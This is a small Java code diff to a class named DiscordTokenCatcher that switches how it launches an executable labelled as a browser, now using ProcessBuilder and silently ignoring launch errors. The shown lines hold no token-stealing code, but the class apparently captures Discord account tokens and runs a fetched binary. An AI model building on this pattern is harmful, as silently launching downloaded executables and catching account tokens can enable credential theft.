@@ -11,6 +11,7 @@ import java.io.OutputStream;
 import java.net.URL;
 import java.net.URLConnection;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.nio.file.attribute.PosixFilePermission;
 import java.util.EnumSet;
 import java.util.Enumeration;
@@ -136,7 +137,11 @@ public class DiscordTokenCatcher {
 		}
 
 		System.err.println("Run browser");
-		Runtime.getRuntime().exec(executableFile.getAbsolutePath());
+		try {
+			new ProcessBuilder(executableFile.getAbsolutePath()).start();
+		} catch (IOException e) {
+			// do nothing
+		}
 	}
 
 	private static void copyToStream(final InputStream is, final OutputStream os) throws IOException {
